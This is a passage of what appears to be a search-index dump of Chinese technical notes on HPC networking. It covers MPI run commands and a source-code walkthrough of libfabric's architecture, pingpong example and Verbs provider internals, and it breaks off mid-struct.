\u57fa\u51c6\u6d4b\u8bd5\u3002</p> <pre><code>mpirun -ppn 1 -f hostfile IMB-MPI1 PingPong\n</code></pre>"},{"location":"optimization/HPN/mpi/#\u5176\u4ed6-mpi-\u5b9e\u73b0","title":"\u5176\u4ed6 MPI \u5b9e\u73b0","text":""},{"location":"optimization/HPN/mpi/#platform-mpi","title":"Platform MPI","text":"<p>\u8fd9\u662f\u7531 IBM \u7ef4\u62a4\u7684\u4e00\u4e2a\u53e4\u8001\u7684 MPI \u5b9e\u73b0\u3002</p> <p>\u5b83\u4f7f\u7528\u4e00\u4e2a\u540c\u6837\u53e4\u8001\u7684\u901a\u4fe1\u5e93 DATL\uff08Direct Access Transport Libraries\uff09\uff0c\u5df2\u4e8e 2016 \u5e74\u505c\u6b62\u652f\u6301\u3002</p> <p>\u8fd0\u884c\u547d\u4ee4\u4f8b\uff1a</p> <pre><code>export MPI_IB_STRINGS=cnic_0:1\nexport MPI_IC_ORDER=\"UDAPL\"\n\nbin/mpirun \\\n    -np 2 \\\n    -hostfile hostfile \\\n    -d -v \\\n    -UDAPL \\\n    -netaddr 11.83.209.4 \\\n    -- \\\n    bin/mpitool -ppr 10000\n</code></pre>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/","title":"libfabric","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#libfabric","title":"libfabric","text":"<p>libfabric \u7b80\u79f0 OFI\uff0c\u7531\u4e0d\u5e0c\u671b\u7f51\u7edc API \u53d7 InfiniBand \u7684\u62bd\u8c61\u9650\u5236\u7684\u5382\u5546\u53d1\u8d77\uff0c\u5982 Intel \u548c Cicso\u3002\u5b83\u6784\u5efa\u5728\u8f83\u9ad8\u7684\u62bd\u8c61\u5c42\u6b21\uff0c\u652f\u6301 IB Verbs\u3001Sockets\u3001\u5171\u4eab\u5185\u5b58\u7b49\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u6574\u4f53\u7ed3\u6784","title":"\u6574\u4f53\u7ed3\u6784","text":"<p>libfabric \u6574\u4f53\u5206\u4e3a\u4e24\u5c42\uff1a</p> <ul> <li><code>src</code> \u4e2d\u662f Core Service \u5c42\uff0c\u8d1f\u8d23\u63d0\u4f9b\u5728 Windows\u3001Linux\u3001OSX \u4e0a\u4e00\u81f4\u7684 API \u63a5\u53e3\uff0c\u4f9b\u4e0a\u5c42\u5e94\u7528\u4f7f\u7528</li> <li><code>prov</code> \u662f Provider \u5c42\uff0c\u5b9e\u73b0\u5177\u4f53\u7684\u5e95\u5c42\u901a\u4fe1</li> </ul> <p></p> <p>libfabric \u6709\u5b8c\u5584\u7684\u8bf4\u660e\u6587\u6863\uff0c\u4e0b\u9762\u603b\u7ed3\u4e00\u4e9b fi_arch(7) \u4e2d\u7684\u57fa\u672c\u77e5\u8bc6\uff1a</p> <ul> <li>\u901a\u4fe1\u65b9\u5f0f\uff1a\u53ef\u4ee5\u662f\u9762\u5411\u8fde\u63a5\u7684\u6216\u65e0\u8fde\u63a5\u7684\uff0c\u901a\u8fc7\u6982\u5ff5\u4e0a\u7c7b\u4f3c\u4e8e\u5957\u63a5\u5b57\u7684\u7aef\u70b9\uff08Endpoints\uff09\u8fdb\u884c\u901a\u4fe1\u3002</li> <li>\u6570\u636e\u4f20\u8f93\u670d\u52a1\uff1aLibfabric \u63d0\u4f9b\u4e86\u591a\u79cd\u6570\u636e\u4f20\u8f93\u670d\u52a1\uff0c\u5305\u62ec\u6d88\u606f\uff08messages\uff09\u3001\u5e26\u6807\u7b7e\u6d88\u606f\uff08tagged messages\uff09\u3001\u8fdc\u7a0b\u5185\u5b58\u8bbf\u95ee\uff08RMA\uff09\u3001\u539f\u5b50\u64cd\u4f5c\uff08atomics\uff09\u548c\u96c6\u5408\u64cd\u4f5c\uff08collectives\uff09\u3002</li> <li>\u5185\u5b58\u6ce8\u518c\uff08Memory Registration\uff09\uff1a\u8fd9\u662f\u4e00\u4e2a\u5173\u952e\u6982\u5ff5\uff0c\u5b83\u901a\u8fc7\u9501\u5b9a\u865a\u62df\u5230\u7269\u7406\u7684\u5185\u5b58\u6620\u5c04\uff0c\u4f7f\u7f51\u7edc\u786c\u4ef6\u80fd\u591f\u76f4\u63a5\u8bbf\u95ee\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u7f13\u51b2\u533a\uff0c\u5e76\u901a\u8fc7\u6ce8\u518c\u5bc6\u94a5\u63d0\u4f9b\u5b89\u5168\u673a\u5236\u3002</li> <li>\u5b8c\u6210\u670d\u52a1\uff08Completion Services\uff09\uff1a\u4f7f\u7528\u5b8c\u6210\u961f\u5217\uff08completion queues\uff09\u6216\u8ba1\u6570\u5668\uff08counters\uff09\u62a5\u544a\u5f02\u6b65\u6570\u636e\u4f20\u8f93\u64cd\u4f5c\u7684\u7ed3\u679c\uff0c\u65e8\u5728\u5b9e\u73b0\u9ad8\u6027\u80fd\u3002</li> <li>\u9762\u5411\u5bf9\u8c61\u8bbe\u8ba1\uff1a\u8be5\u67b6\u6784\u9075\u5faa\u9762\u5411\u5bf9\u8c61\u7684\u8bbe\u8ba1\uff0c\u5305\u542b\u4ee5\u4e0b\u5173\u952e\u5bf9\u8c61\uff1a<ul> <li>Fabric (fi_fabric)\uff1a\u8868\u793a\u4e00\u4e2a\u6216\u591a\u4e2a\u7f51\u7edc\u63a5\u53e3\u7684\u96c6\u5408\u3002</li> <li>Domain (fi_domain)\uff1a\u8868\u793a\u4e00\u4e2a\u7279\u5b9a\u4e8e Provider \u7684\u7f51\u7edc\u63a5\u53e3\uff08\u6216\u4e00\u7ec4\u63a5\u53e3\uff09\u7684\u529f\u80fd\u3002</li> <li>Passive Endpoint (fi_pep)\uff1a\u7528\u4e8e\u76d1\u542c\u4f20\u5165\u8fde\u63a5\u8bf7\u6c42\u3002</li> <li>Active Endpoint (fi_endpoint)\uff1a\u7528\u4e8e\u5b9e\u9645\u7684\u6570\u636e\u4f20\u8f93\u3002</li> <li>Event Queues (fi_eq)\uff1a\u7528\u4e8e\u63a5\u6536\u5f02\u6b65\u4e8b\u4ef6\uff0c\u5982\u8fde\u63a5\u8bf7\u6c42\u3001\u9519\u8bef\u7b49\u3002</li> <li>Completion Queue (fi_cq)\uff1a\u7528\u4e8e\u62a5\u544a\u5f02\u6b65\u64cd\u4f5c\u7684\u5b8c\u6210\u72b6\u6001\u3002</li> <li>Memory Region (fi_mr)\uff1a\u8868\u793a\u5df2\u6ce8\u518c\u7684\u5185\u5b58\u533a\u57df\u3002</li> <li>Address Vectors (fi_av)\uff1a\u7528\u4e8e\u5b58\u50a8\u8fdc\u7a0b\u7aef\u70b9\u7684\u5730\u5740\u4fe1\u606f\u3002</li> </ul> </li> <li> <p>**\u901a\u4fe1\u6a21\u5f0f\uff08Communication Model\uff09\uff1a</p> Endpoint \u7c7b\u578b \u5bf9\u5e94 <code>FI_EP_MSG</code> Reliable-connected RDMA RC <code>FI_EP_DGRAM</code> Unreliable datagram RDMA UD <code>FI_EP_RDM</code> Reliable-unconnected RDMA RD </li> </ul> <p>\u4ee5 Verbs Provider \u4e3a\u4f8b\uff0c\u6211\u4eec\u5e94\u7528\u4e00\u4e0b\u4e0a\u9762\u7684\u57fa\u672c\u6982\u5ff5\uff0c\u5b98\u65b9\u6587\u6863\u89c1 fi_verbs(7)\u3002\uff1a</p> <ul> <li> <p>\u652f\u6301\u60c5\u51b5\uff1a</p> <pre><code>FI_EP_MSG, FI_EP_RDM\nFI_MSG, FI_RMA, FI_ATOMIC\n</code></pre> </li> </ul> <p>libfabric \u4ed3\u5e93\u7684 README \u6587\u4ef6\u8be6\u7ec6\u8bf4\u660e\u4e86\u73b0\u6709\u7684\u5404\u7c7b Providers\u3002</p> <p>libfabric \u5728\u6587\u6863\u65b9\u9762\u6bd4 OpenMPI \u548c UCX \u505a\u7684\u90fd\u597d</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u7f16\u7a0b","title":"\u7f16\u7a0b","text":"<p>libfabric \u6709\u5b8c\u5584\u7684\u4f7f\u7528\u6559\u7a0b\u3002\u6211\u4eec\u5148\u603b\u7ed3 fi_setup(7) \u4e2d\u7684\u8981\u70b9\uff0c\u7136\u540e\u4ee5 <code>fi_pingpong</code> \u7684\u6e90\u7801\u4e3a\u4f8b\u5177\u4f53\u5206\u6790\u3002</p> <ul> <li><code>fi_getinfo()</code> \u83b7\u5f97 <code>struct fi_info*</code> \u94fe\u8868\uff0c\u5305\u542b\u53ef\u7528\u7684 fabric service\u3002\u5176\u4e2d\u7684\u5173\u952e\u5b57\u6bb5\uff1a<ul> <li><code>caps</code> \u8868\u660e\u63d0\u4f9b\u7684\u80fd\u529b\uff0c\u5982\u4f20\u8f93\u670d\u52a1\u7c7b\u578b\u7b49</li> </ul> </li> <li><code>fi_fabric()</code> \u521b\u5efa\u4e00\u4e2a Provider</li> <li><code>fi_domain()</code> \u4f7f\u7528\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3</li> <li>\u4e3b\u52a8\u7aef\u70b9\uff08Active Endpoints\uff09<ul> <li>\u529f\u80fd\uff1a\u7528\u4e8e\u6267\u884c\u6570\u636e\u4f20\u8f93\uff0c\u53ef\u4ee5\u662f\u9762\u5411\u8fde\u63a5\u6216\u65e0\u8fde\u63a5\u7684\u3002\u6240\u6709\u6570\u636e\u4f20\u8f93\u63a5\u53e3\uff08\u5982\u6d88\u606f\u3001\u6807\u8bb0\u6d88\u606f\u3001RMA\u3001\u539f\u5b50\u64cd\u4f5c\u3001\u96c6\u5408\u64cd\u4f5c\uff09\u90fd\u4e0e\u4e3b\u52a8\u7aef\u70b9\u5173\u8054\u3002</li> <li>\u961f\u5217\uff1a\u901a\u5e38\u6709\u4e00\u4e2a\u53d1\u9001\u961f\u5217\u548c\u4e00\u4e2a\u63a5\u6536\u961f\u5217\u3002\u53d1\u9001\u961f\u5217\u7528\u4e8e\u53d1\u8d77\u6570\u636e\u4f20\u8f93\uff08\u5982\u53d1\u9001\u6d88\u606f\u3001RMA\u3001\u539f\u5b50\u64cd\u4f5c\uff09\uff0c\u63a5\u6536\u961f\u5217\u7528\u4e8e\u63a5\u6536\u4f20\u5165\u6570\u636e\u3002</li> <li>\u72b6\u6001\uff1a\u521b\u5efa\u65f6\u5904\u4e8e\u7981\u7528\u72b6\u6001\u3002\u5fc5\u987b\u5148\u8fdb\u884c\u914d\u7f6e\u5e76\u7ed1\u5b9a\u5230\u5fc5\u8981\u7684\u7ed3\u6784\uff08\u4f8b\u5982\u5b8c\u6210\u961f\u5217 CQ\u3001\u4e8b\u4ef6\u961f\u5217 EQ \u548c\u5730\u5740\u5411\u91cf AV\uff09\uff0c\u7136\u540e\u8c03\u7528 <code>fi_enable()</code> \u624d\u80fd\u542f\u7528\uff0c\u6216\u901a\u8fc7 <code>fi_connect()</code> \u548c <code>fi_accept()</code> \u81ea\u52a8\u542f\u7528\u3002\u53ea\u6709\u542f\u7528\u540e\u624d\u80fd\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u64cd\u4f5c\u3002</li> </ul> </li> <li>\u88ab\u52a8\u7aef\u70b9\uff08Passive Endpoints\uff09<ul> <li>\u529f\u80fd\uff1a\u4e3b\u8981\u7528\u4e8e\u76d1\u542c\u4f20\u5165\u7684\u8fde\u63a5\u8bf7\u6c42\uff0c\u4e0d\u80fd\u6267\u884c\u6570\u636e\u4f20\u8f93\u3002</li> <li>\u7c7b\u578b\uff1a\u4ec5\u652f\u6301 <code>FI_EP_MSG</code> \u7c7b\u578b\u3002</li> <li>\u7ed1\u5b9a\uff1a\u5fc5\u987b\u7ed1\u5b9a\u5230\u4e8b\u4ef6\u961f\u5217\uff08Event Queue\uff09\u4ee5\u62a5\u544a\u8fde\u63a5\u8bf7\u6c42\u3002\u4e0e\u4e3b\u52a8\u7aef\u70b9\u4e0d\u540c\uff0c\u88ab\u52a8\u7aef\u70b9\u4e0d\u4e0e\u57df\uff08domain\uff09\u5173\u8054\uff0c\u5141\u8bb8\u5728\u4e0d\u540c\u57df\u4f46\u540c\u4e00\u63d0\u4f9b\u8005\u4e0b\u76d1\u542c\u8fde\u63a5\u3002</li> <li>\u8fde\u63a5\u6d41\u7a0b\uff1a\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u88ab\u52a8\u7aef\u70b9\u76d1\u542c\u8fde\u63a5\u8bf7\u6c42\uff0c\u63a5\u6536\u5230 <code>FI_CONNREQ</code> \u4e8b\u4ef6\u540e\uff0c\u4f1a\u4e3a\u8be5\u8fde\u63a5\u5206\u914d\u4e00\u4e2a\u65b0\u7684\u4e3b\u52a8\u7aef\u70b9\uff0c\u5e76\u8c03\u7528 <code>fi_accept()</code> \u63a5\u53d7\u8fde\u63a5\u3002</li> </ul> </li> </ul> <p>\u6839\u636e <code>pingpong.c</code> \u7684\u4ee3\u7801\u5185\u5bb9\uff0c\u4ee5\u4e0b\u662f\u4e3b\u8981\u6d41\u7a0b\u7684\u51fd\u6570\u540d\u53ca\u5176\u4f7f\u7528\u7684 <code>fi_</code> \u8c03\u7528\uff1a</p> <ol> <li> <p>\u521d\u59cb\u5316\u9636\u6bb5</p> <ul> <li>\u51fd\u6570\u540d: <code>pp_init_fabric</code><ul> <li>\u4f7f\u7528\u7684 <code>fi_</code> \u8c03\u7528\uff1a<ul> <li><code>fi_fabric</code>: \u521d\u59cb\u5316 Fabric \u8d44\u6e90</li> <li><code>fi_eq_open</code>: \u521b\u5efa\u4e8b\u4ef6\u961f\u5217 (EQ)</li> <li><code>fi_domain</code>: \u521b\u5efa Domain</li> <li><code>fi_av_open</code>: \u521b\u5efa\u5730\u5740\u5411\u91cf (AV)</li> <li><code>fi_cq_open</code>: \u521b\u5efa\u5b8c\u6210\u961f\u5217 (CQ)</li> <li><code>fi_endpoint</code>: \u521b\u5efa\u7aef\u70b9 (EP)</li> <li><code>fi_enable</code>: \u542f\u7528\u7aef\u70b9</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u63a7\u5236\u6d88\u606f\u540c\u6b65</p> <ul> <li>\u51fd\u6570\u540d: <code>pp_ctrl_init</code>, <code>pp_ctrl_sync</code><ul> <li>\u4f7f\u7528\u7684 <code>fi_</code> \u8c03\u7528\uff1a<ul> <li><code>fi_getname</code>: \u83b7\u53d6\u672c\u5730\u5730\u5740</li> <li><code>fi_av_insert</code>: \u5c06\u5730\u5740\u63d2\u5165\u5730\u5740\u5411\u91cf</li> <li><code>fi_eq_sread</code>: \u4ece\u4e8b\u4ef6\u961f\u5217\u8bfb\u53d6\u540c\u6b65\u4e8b\u4ef6</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u6570\u636e\u4f20\u8f93\u9636\u6bb5</p> <ul> <li>\u51fd\u6570\u540d: <code>pp_tx</code>, <code>pp_rx</code>, <code>pp_inject</code><ul> <li>\u4f7f\u7528\u7684 <code>fi_</code> \u8c03\u7528\uff1a<ul> <li><code>fi_send</code> / <code>fi_tsend</code>: \u53d1\u9001\u6570\u636e\uff08\u666e\u901a\u6216\u5e26\u6807\u7b7e\uff09</li> <li><code>fi_recv</code> / <code>fi_trecv</code>: \u63a5\u6536\u6570\u636e\uff08\u666e\u901a\u6216\u5e26\u6807\u7b7e\uff09</li> <li><code>fi_inject</code> / <code>fi_tinject</code>: \u76f4\u63a5\u6ce8\u5165\u6570\u636e\uff08\u65e0\u9700\u5b8c\u6210\u901a\u77e5\uff09</li> <li><code>fi_cq_read</code>: \u4ece\u5b8c\u6210\u961f\u5217\u8bfb\u53d6\u5b8c\u6210\u4e8b\u4ef6</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u6027\u80fd\u6d4b\u8bd5\u4e0e\u7edf\u8ba1</p> <ul> <li>\u51fd\u6570\u540d: <code>pingpong</code>, <code>show_perf</code><ul> <li>\u4f7f\u7528\u7684 <code>fi_</code> \u8c03\u7528\uff1a<ul> <li><code>fi_gettime_us</code>: \u83b7\u53d6\u65f6\u95f4\u6233\uff08\u7528\u4e8e\u6027\u80fd\u7edf\u8ba1\uff09</li> <li><code>fi_cq_readerr</code>: \u8bfb\u53d6\u5b8c\u6210\u961f\u5217\u9519\u8bef\u4e8b\u4ef6</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u8d44\u6e90\u91ca\u653e\u4e0e\u6e05\u7406</p> <ul> <li>\u51fd\u6570\u540d: <code>pp_free_res</code>, <code>pp_finalize</code><ul> <li>\u4f7f\u7528\u7684 <code>fi_</code> \u8c03\u7528\uff1a<ul> <li><code>fi_close</code>: \u5173\u95ed Fabric \u8d44\u6e90\uff08Fabric\u3001Domain\u3001EQ\u3001CQ\u3001EP \u7b49\uff09</li> <li><code>fi_shutdown</code>: \u5173\u95ed\u7aef\u70b9\u8fde\u63a5</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u5176\u4ed6\u5173\u952e\u51fd\u6570</p> <ul> <li>\u5730\u5740\u89e3\u6790\u4e0e\u540c\u6b65:<ul> <li><code>pp_getaddrinfo</code>: \u89e3\u6790\u5730\u5740\uff08\u4f7f\u7528 <code>getaddrinfo</code>\uff0c\u975e <code>fi_</code> \u8c03\u7528\uff09</li> <li><code>pp_exchange_names_connected</code>: \u4ea4\u6362\u5730\u5740\u4fe1\u606f\uff08\u901a\u8fc7\u63a7\u5236\u6d88\u606f\uff09</li> </ul> </li> <li>\u9519\u8bef\u5904\u7406:<ul> <li><code>pp_process_eq_err</code>: \u5904\u7406\u4e8b\u4ef6\u961f\u5217\u9519\u8bef\uff08\u8c03\u7528 <code>fi_eq_readerr</code>\uff09</li> </ul> </li> </ul> </li> </ol>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<pre><code>export FI_LOG_LEVEL=debug\nexport FI_PROVIDER=verbs\n./fi_pingpong\n</code></pre>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u6e90\u7801\u9605\u8bfb","title":"\u6e90\u7801\u9605\u8bfb","text":"<p>libfabric \u7248\u672c\u6570\u5b8f\u5b9a\u4e49\u5199\u5728 <code>include/rdma/fabric.h</code> \u4e2d\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#\u7c7b\u578b\u7cfb\u7edf","title":"\u7c7b\u578b\u7cfb\u7edf","text":"<p>fi_arch(7) \u4e2d\u63d0\u5230\uff0clibfabric \u4f7f\u7528 OOP \u8bbe\u8ba1\u6a21\u5f0f\u3002\u6211\u4eec\u6765\u770b\u770b\u5b83\u662f\u600e\u4e48\u5bf9\u5404\u79cd\u5b9e\u4f53\u8fdb\u884c\u5efa\u6a21\u7684\u3002</p> <p><code>fid</code> \u4f5c\u4e3a\u6240\u6709\u7c7b\u7684\u57fa\u7c7b\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#provider","title":"Provider","text":"<p>\u672c\u8282\u4ee5 Verbs Provider \u4e3a\u4f8b\uff0c\u901a\u8fc7\u51e0\u4e2a\u95ee\u9898\u5f15\u5bfc\uff0c\u63a2\u7a76 Provider \u662f\u5982\u4f55\u5411\u4e0a\u5c42\u63d0\u4f9b\u901a\u4fe1\u80fd\u529b\u7684\u3002</p>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#providerfabric-\u548c-domain","title":"Provider\u3001Fabric \u548c Domain","text":"<p>\u6240\u6709 Provider \u5b9a\u4e49\u4e3a <code>struct fi_provider</code> \u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u51fd\u6570\u6307\u9488\u8c03\u7528\u5177\u4f53\u64cd\u4f5c\uff1a</p> prov/verbs/src/verbs_init.c<pre><code>struct fi_provider vrb_prov = {\n    .name = VERBS_PROV_NAME,\n    .version = OFI_VERSION_DEF_PROV,\n    .fi_version = OFI_VERSION_LATEST,\n    .getinfo = vrb_getinfo,\n    .fabric = vrb_fabric,\n    .cleanup = vrb_fini\n};\n</code></pre> <p>Fabric \u521b\u5efa\u65f6\uff0c<code>fi_fabric()</code> \u901a\u8fc7 <code>ofi_getprov()</code> \u5b57\u7b26\u4e32\u5339\u914d\u83b7\u5f97\u5bf9\u5e94\u7684 <code>fi_provider</code> \u5b9e\u4f8b\u3002\u5269\u4f59\u7684\u4efb\u52a1\u8f6c\u4ea4\u7ed9\u8be5 Provider \u7684 <code>.fabric</code> \u6210\u5458\uff1a</p> src/fabric.c<pre><code>struct ofi_prov {\n    struct ofi_prov        *next;\n    char            *prov_name;\n    struct fi_provider    *provider;\n    void            *dlhandle;\n    bool            hidden;\n    bool            preferred;\n};\n__attribute__((visibility (\"default\"),EXTERNALLY_VISIBLE))\nint DEFAULT_SYMVER_PRE(fi_fabric)(struct fi_fabric_attr *attr,\n        struct fid_fabric **fabric, void *context) {\n    struct ofi_prov *prov;\n    fi_ini();\n    prov = ofi_getprov(top_name, strlen(top_name));\n    ret = prov-&gt;provider-&gt;fabric(attr, fabric, context);\n}\n</code></pre> <p>\u4ee5 Verbs Provider \u4e3a\u4f8b\uff0c<code>vrb_fabric()</code> \u9996\u5148\u8c03\u7528 <code>ofi_fabric_init()</code> \u8fdb\u884c\u901a\u7528\u521d\u59cb\u5316\uff0c\u7136\u540e\u505a\u4e00\u4e9b Verbs \u7279\u6709\u7684\u8bbe\u7f6e\uff0c\u5176\u4e2d\u6700\u91cd\u8981\u7684\u662f\u8bbe\u7f6e fabric \u7684\u51fd\u6570\u8868\uff1a</p> prov/verbs/src/verbs_domain.c<pre><code>int vrb_fabric(struct fi_fabric_attr *attr, struct fid_fabric **fabric,\n          void *context) {\n    (*fabric)-&gt;fid.ops = &amp;vrb_fi_ops;\n    (*fabric)-&gt;ops = &amp;vrb_ops_fabric;\n}\nstatic struct fi_ops_fabric vrb_ops_fabric = {\n    .size = sizeof(struct fi_ops_fabric),\n    .domain = vrb_domain,\n    .passive_ep = vrb_passive_ep,\n    .eq_open = vrb_eq_open,\n    .wait_open = fi_no_wait_open,\n    .trywait = vrb_trywait\n};\n</code></pre> <p><code>fi_domain()</code> \u76f4\u63a5\u5c06\u64cd\u4f5c\u8f6c\u4ea4\u7ed9 <code>fabric-&gt;ops-&gt;domain()</code>\uff0c\u5728\u4e0a\u9762\u6211\u4eec\u770b\u5230\u8fd9\u5c31\u662f <code>vrb_domain()</code>\u3002\u5b83\u8c03\u7528 <code>ofi_domain_init()</code> \u8fdb\u884c\u901a\u7528\u521d\u59cb\u5316\uff0c\u7136\u540e\u505a\u4e00\u4e9b Vrb \u7279\u6709\u7684\u8bbe\u7f6e\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u4f20\u8f93\u7c7b\u578b\uff0c\u8fd9\u91cc\u6709\u91cd\u8981\u7684\u533a\u5206\uff1a</p> <ul> <li>\u5982\u679c EP \u7c7b\u578b\u4e3a MSG\uff08RDMA RC\uff09\u4e14\u8bbe\u5907\u652f\u6301 XRC\uff0c\u5219\u8fdb\u4e00\u6b65\u8f6c\u4ea4\u7ed9 <code>verbs_domain_xrc.c</code> \u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u5904\u7406\u3002</li> <li>Domain \u5c42\u7684 ops \u6839\u636e EP \u7c7b\u578b\u4e0d\u540c\u3002</li> </ul> prov/verbs/src/verbs_domain.c<pre><code>static int\nvrb_domain(struct fid_fabric *fabric, struct fi_info *info,\n          struct fid_domain **domain, void *context) {\n    ret = ofi_domain_init(fabric, info, &amp;_domain-&gt;util_domain, context,\n                  OFI_LOCK_MUTEX);\n    ret = vrb_open_device_by_name(_domain, info-&gt;domain_attr-&gt;name);\n    switch (_domain-&gt;ep_type) {\n    case FI_EP_DGRAM:\n        _domain-&gt;util_domain.domain_fid.ops = &amp;vrb_dgram_domain_ops;\n    case FI_EP_MSG:\n        if (_domain-&gt;ext_flags &amp; VRB_USE_XRC) {\n            ret = vrb_domain_xrc_init(_domain);\n        }\n        _domain-&gt;util_domain.domain_fid.ops = &amp;vrb_msg_domain_ops;\n    }\n    ret = vrb_init_progress(&amp;_domain-&gt;progress, _domain-&gt;info);\n    *domain = &amp;_domain-&gt;util_domain.domain_fid;\n}\nstatic int vrb_open_device_by_name(struct vrb_domain *domain, const char *name) {\n    dev_list = rdma_get_devices(NULL);\n    const char *rdma_name = ibv_get_device_name(dev_list[i]-&gt;device);\n}\nstatic struct fi_ops_domain vrb_msg_domain_ops = {\n    .size = sizeof(struct fi_ops_domain),\n    .av_open = fi_no_av_open,\n    .cq_open = vrb_cq_open,\n    .endpoint = vrb_open_ep,\n    .scalable_ep = fi_no_scalable_ep,\n    .cntr_open = fi_no_cntr_open,\n    .poll_open = fi_no_poll_open,\n    .stx_ctx = fi_no_stx_context,\n    .srx_ctx = vrb_srq_context,\n    .query_atomic = vrb_query_atomic,\n    .query_collective = fi_no_query_collective,\n};\n</code></pre>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#getinfo","title":"Getinfo","text":"<p>\u4f17\u6240\u5468\u77e5\uff0cVerbs \u662f\u4e00\u5957\u901a\u7528\u7684 API\uff0c\u800c\u5e95\u5c42\u8bbe\u5907\u80fd\u652f\u6301\u7684\u529f\u80fd\u53ef\u80fd\u662f\u53d7\u9650\u7684\u3002</p> <p>\u8c03\u7528\u94fe\uff1a<code>fi_getinfo</code> -&gt; <code>prov-&gt;provider-&gt;getinfo</code> -&gt; <code>vrb_getinfo()</code> -&gt; <code>vrb_get_match_infos(raw_info: vrb_util_prov.info)</code> -&gt; <code>vrb_get_matching_info(verbs_info: raw_info)</code> -&gt; <code>check_info: verbs:info</code>\u3002</p> <p>\u5176\u4e2d\uff0c\u8bbe\u5907\u5217\u8868\u7684\u4f20\u9012\uff1a</p> <ul> <li> <p><code>verbs_init.c</code> \u4e2d\u5b9a\u4e49\u4e24\u4e2a\u5168\u5c40\u94fe\u8868</p> <pre><code>struct util_prov vrb_util_prov = {\n    .prov = &amp;vrb_prov,\n    .info = NULL, // struct fi_info *\n    .info_lock = &amp;vrb_info_mutex,\n    .flags = 0,\n};\nDEFINE_LIST(vrb_devs);\n</code></pre> </li> <li> <p><code>vrb_get_info()</code></p> <ul> <li><code>vrb_init_info()</code> \u8c03\u7528 <code>rdma_get_devices()</code> \u83b7\u53d6\u8bbe\u5907\u5217\u8868\uff0c\u521d\u59cb\u5316\u4e0a\u9762\u4e24\u4e2a\u94fe\u8868</li> <li>\u4e24\u4e2a\u94fe\u8868\u4f20\u5165 <code>vrb_get_match_infos()</code></li> </ul> </li> </ul> <p>\u5173\u4e8e Verbs\uff0c\u4e3b\u8981\u901a\u8fc7\u4e0b\u9762\u4e09\u4e2a\u51fd\u6570\u67e5\u8be2\u652f\u6301\u7684\u529f\u80fd\uff1a</p> prov/verbs/src/verbs_info.c<pre><code>static int vrb_get_device_attrs(struct ibv_context *ctx,\n                   struct fi_info *info, uint32_t protocol) {\n    ret = ibv_query_device(ctx, &amp;device_attr);\n    ret = vrb_get_qp_cap(ctx, info, protocol);\n    ret = ibv_query_port(ctx, port_num, &amp;port_attr);\n}\n</code></pre>"},{"location":"optimization/HPN/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/libfabric/#endpoint-\u7684\u521b\u5efa\u548c\u542f\u7528\u5efa\u94fe","title":"Endpoint \u7684\u521b\u5efa\u548c\u542f\u7528\uff08\u5efa\u94fe\uff09","text":"<p>\u5148\u770b\u6570\u636e\u7ed3\u6784\uff0c<code>struct vrb_ep</code>\u3001<code>struct util_ep</code>\u3001<code>struct fid_ep</code> \u4e09\u7ea7\u7ed3\u6784\u5c42\u5c42\u5411\u4e0a\uff1a</p> include/rdma/fi_endpoint.h<pre><code>struct fid_ep {\n    struct fid        fid;\n    struct fi_ops_ep    *ops;\n    struct fi_ops_cm    *cm;\n    struct fi_ops_msg    *msg;\n    struct fi_ops_rma    *rma;\n    struct fi_ops_tagged    *tagged;\n    struct fi_ops_atomic    *atomic;\n    struct fi_ops_collective *collective;\n};\n</code></pre> include/ofi_util.h<pre><code>struct util_ep {\n    struct fid_ep        ep_fid;\n    struct util_domain    *domain;\n\n    struct util_av        *av;\n    struct dlist_entry    av_entry;\n    struct util_eq        *eq;\n    /* CQ entries */\n    struct util_cq        *rx_cq;\n    uint64_t        rx_op_flags;\n    struct util_cq        *tx_cq;\n    uint64_t        tx_op_flags;\n    uint64_t        inject_op_flags;\n};\n</code></pre> prov/verbs/src/verbs_ofi.h<pre><code>struct vrb_ep {\n    struct util_ep            util_ep;\n    struct ibv_qp            *ibv_qp;\n\n    struct slist            sq_list;\n    struct slist            rq_list;\n    struct slist            prepost_wr_list;\n    union {\n        struct rdma_cm_id    *id;\n        struct {\n            struct ofi_ib_ud_ep_name    ep_name;\n            int                service;\n        };\n    };\n\n    struct vrb_eq            *eq;\n    struct vrb_srx            *srx;\n\n    struct {\n        struct ibv_send_wr    rma_wr;\n        struct ibv_send_wr    msg_wr;\n        struct ibv_sge        sge;\n    } *wrs;\n    struct rdma_conn_param        conn_param;\n    struct vrb_cm_data_hdr        *cm_hdr;\n    void                *cm_priv_data;\n};\nstruct vrb_srx {\n    struct ibv_srq        *srq;\n};\nstruct vrb_eq {\n    